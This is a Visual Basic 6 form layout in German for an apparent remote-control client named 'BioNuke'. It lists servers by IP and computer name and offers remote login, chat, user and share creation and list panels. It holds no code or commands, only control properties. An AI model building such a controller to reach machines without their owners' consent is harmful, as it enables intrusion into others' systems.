         Height          =   255
         Index           =   8
         Left            =   1920
         TabIndex        =   105
         Top             =   360
         Width           =   1695
      End
      Begin VB.TextBox Text 
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   27.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2805
         Index           =   25
         Left            =   600
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   101
         Text            =   "frmMain.frx":A95A
         Top             =   3000
         Width           =   6135
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   25
         Left            =   4320
         TabIndex        =   102
         Top             =   6000
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Drucken"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A962
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Schriftart:"
         Height          =   255
         Index           =   40
         Left            =   600
         TabIndex        =   112
         Top             =   1200
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Textgröße:"
         Height          =   255
         Index           =   39
         Left            =   600
         TabIndex        =   109
         Top             =   1560
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Formatierung:"
         Height          =   255
         Index           =   38
         Left            =   600
         TabIndex        =   104
         Top             =   360
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Text:"
         Height          =   255
         Index           =   35
         Left            =   600
         TabIndex        =   103
         Top             =   2760
         Width           =   2415
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   17
      Left            =   3600
      TabIndex        =   91
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   27
         Left            =   1680
         TabIndex        =   94
         Text            =   "BioNuke"
         Top             =   1080
         Width           =   4575
      End
      Begin VB.TextBox Text 
         Height          =   285
         IMEMode         =   3  'DISABLE
         Index           =   26
         Left            =   1680
         PasswordChar    =   "*"
         TabIndex        =   93
         Text            =   "BioNuke"
         Top             =   1560
         Width           =   4575
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   24
         Left            =   1680
         TabIndex        =   92
         Text            =   "BioNuke"
         Top             =   4080
         Width           =   4575
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   23
         Left            =   3840
         TabIndex        =   95
         Top             =   2760
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Einrichten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A97E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   24
         Left            =   3840
         TabIndex        =   96
         Top             =   5040
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Löschen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A99A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Name:"
         Height          =   255
         Index           =   37
         Left            =   960
         TabIndex        =   99
         Top             =   1080
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Pass:"
         Height          =   255
         Index           =   36
         Left            =   960
         TabIndex        =   98
         Top             =   1560
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Name:"
         Height          =   255
         Index           =   34
         Left            =   960
         TabIndex        =   97
         Top             =   4080
         Width           =   2415
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   16
      Left            =   3600
      TabIndex        =   79
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   23
         Left            =   1680
         TabIndex        =   88
         Text            =   "BioNuke"
         Top             =   4080
         Width           =   4575
      End
      Begin VB.CheckBox Check 
         Caption         =   "Unbegrenzt"
         Height          =   255
         Index           =   7
         Left            =   4200
         TabIndex        =   86
         Tag             =   "/USERS:8"
         Top             =   2040
         Width           =   2055
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   22
         Left            =   1680
         TabIndex        =   85
         Text            =   "8"
         Top             =   2040
         Width           =   2295
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   21
         Left            =   1680
         TabIndex        =   83
         Text            =   "C:/"
         Top             =   1560
         Width           =   4575
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   20
         Left            =   1680
         TabIndex        =   81
         Text            =   "BioNuke"
         Top             =   1080
         Width           =   4575
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   21
         Left            =   3840
         TabIndex        =   87
         Top             =   2760
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Einrichten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A9B6
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   22
         Left            =   3840
         TabIndex        =   90
         Top             =   5040
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Löschen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A9D2
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Name:"
         Height          =   255
         Index           =   33
         Left            =   960
         TabIndex        =   89
         Top             =   4080
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Max.:"
         Height          =   255
         Index           =   32
         Left            =   960
         TabIndex        =   84
         Top             =   2040
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Pfad:"
         Height          =   255
         Index           =   31
         Left            =   960
         TabIndex        =   82
         Top             =   1560
         Width           =   2415
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Name:"
         Height          =   255
         Index           =   30
         Left            =   960
         TabIndex        =   80
         Top             =   1080
         Width           =   2415
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   11
      Left            =   3600
      TabIndex        =   76
      Top             =   0
      Width           =   7215
      Begin VB.ListBox List 
         Height          =   6105
         Index           =   5
         Left            =   120
         TabIndex        =   77
         Top             =   120
         Width           =   6975
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   20
         Left            =   4680
         TabIndex        =   78
         Top             =   6360
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Auflisten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A9EE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   10
      Left            =   3600
      TabIndex        =   73
      Top             =   0
      Width           =   7215
      Begin VB.ListBox List 
         Height          =   6105
         Index           =   4
         Left            =   120
         TabIndex        =   75
         Top             =   120
         Width           =   6975
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   19
         Left            =   4680
         TabIndex        =   74
         Top             =   6360
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Auflisten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AA0A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   12
      Left            =   3600
      TabIndex        =   69
      Top             =   0
      Width           =   7215
      Begin VB.ListBox List 
         Height          =   5910
         Index           =   3
         Left            =   360
         TabIndex        =   70
         Top             =   240
         Width           =   6495
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   18
         Left            =   4440
         TabIndex        =   71
         Top             =   6480
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Auflisten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AA26
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Anzahl:"
         Height          =   255
         Index           =   29
         Left            =   360
         TabIndex        =   72
         Top             =   6240
         Width           =   2415
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   9
      Left            =   3600
      TabIndex        =   57
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   17
         Left            =   1320
         TabIndex        =   63
         Top             =   4800
         Width           =   5535
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   16
         Left            =   1320
         TabIndex        =   61
         Top             =   4440
         Width           =   5535
      End
      Begin VB.ListBox List 
         Height          =   3180
         Index           =   2
         Left            =   600
         TabIndex        =   60
         Top             =   240
         Width           =   6255
      End
      Begin VB.ListBox ListFavs 
         Height          =   450
         Left            =   4560
         TabIndex        =   59
         Top             =   5880
         Visible         =   0   'False
         Width           =   1095
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   14
         Left            =   4440
         TabIndex        =   58
         Top             =   3600
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Auflisten / Aktualisieren"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AA42
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   15
         Left            =   5280
         TabIndex        =   65
         Top             =   5160
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Neu anlegen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AA5E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   16
         Left            =   3360
         TabIndex        =   67
         Top             =   5160
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Löschen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AA7A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   17
         Left            =   1320
         TabIndex        =   68
         Top             =   5160
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Ziel Ändern"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AA96
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Anzahl:"
         Height          =   255
         Index           =   28
         Left            =   600
         TabIndex        =   66
         Top             =   3600
         Width           =   1815
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Ziel:"
         Height          =   255
         Index           =   27
         Left            =   720
         TabIndex        =   64
         Top             =   4800
         Width           =   1215
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Name:"
         Height          =   255
         Index           =   26
         Left            =   720
         TabIndex        =   62
         Top             =   4440
         Width           =   1215
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   37
      Left            =   3600
      TabIndex        =   18
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   9
         Left            =   240
         TabIndex        =   20
         Top             =   5640
         Width           =   5295
      End
      Begin VB.TextBox Text 
         Height          =   5415
         Index           =   8
         Left            =   240
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   19
         Top             =   120
         Width           =   6855
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   3
         Left            =   5640
         TabIndex        =   21
         Top             =   5640
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Senden"
         ENAB            =   0   'False
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AAB2
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   4
         Left            =   240
         TabIndex        =   22
         Top             =   6360
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Chat starten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AACE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   5
         Left            =   2040
         TabIndex        =   23
         Top             =   6360
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Chat schließen"
         ENAB            =   0   'False
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AAEA
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   4
      Left            =   3600
      TabIndex        =   9
      Top             =   0
      Width           =   7215
      Begin VB.FileListBox File1 
         Height          =   285
         Left            =   1320
         TabIndex        =   12
         Top             =   3720
         Visible         =   0   'False
         Width           =   615
      End
      Begin VB.ListBox List 
         Height          =   840
         Index           =   1
         Left            =   480
         TabIndex        =   11
         Top             =   1080
         Width           =   6375
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   2
         Left            =   5040
         TabIndex        =   17
         Top             =   2040
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Übernehmen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AB06
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Autor:"
         Height          =   255
         Index           =   16
         Left            =   480
         TabIndex        =   16
         Top             =   2880
         Width           =   6615
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Aktuell:"
         Height          =   255
         Index           =   15
         Left            =   480
         TabIndex        =   15
         Top             =   4320
         Width           =   6615
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Beschreibung:"
         Height          =   975
         Index           =   14
         Left            =   480
         TabIndex        =   14
         Top             =   3120
         Width           =   6495
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Name:"
         Height          =   255
         Index           =   13
         Left            =   480
         TabIndex        =   13
         Top             =   2640
         Width           =   6615
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Verfügbare Skins:"
         Height          =   255
         Index           =   12
         Left            =   480
         TabIndex        =   10
         Top             =   840
         Width           =   3495
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   2
      Left            =   3600
      TabIndex        =   40
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Appearance      =   0  '2D
         Height          =   285
         Index           =   15
         Left            =   720
         TabIndex        =   42
         Text            =   "12121"
         Top             =   4080
         Width           =   1215
      End
      Begin MSComctlLib.ListView ListSvr 
         Height          =   3135
         Left            =   120
         TabIndex        =   41
         Top             =   600
         Width           =   6975
         _ExtentX        =   12303
         _ExtentY        =   5530
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         Icons           =   "ImageList1"
         SmallIcons      =   "ImageList1"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   4
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "IP-Adresse"
            Object.Width           =   3422
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Computername"
            Object.Width           =   3052
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Servername"
            Object.Width           =   3087
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Windows"
            Object.Width           =   2541
         EndProperty
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   10
         Left            =   5400
         TabIndex        =   44
         Top             =   3840
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Login"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AB22
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   11
         Left            =   240
         TabIndex        =   45
         Top             =   4440
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Starten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AB3E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         BackStyle       =   0  'Transparent
         Caption         =   "Port:"
         Height          =   255
         Index           =   0
         Left            =   240
         TabIndex        =   43
         Top             =   4080
         Width           =   2175
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   1
      Left            =   3600
      TabIndex        =   3
      Top             =   0
      Width           =   7215
      Begin VB.ListBox List 
         Height          =   6105
         Index           =   0
         Left            =   240
         TabIndex        =   4
         Top             =   240
         Width           =   6855
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   0
         Left            =   240
         TabIndex        =   5
         Top             =   6480
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Leeren"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
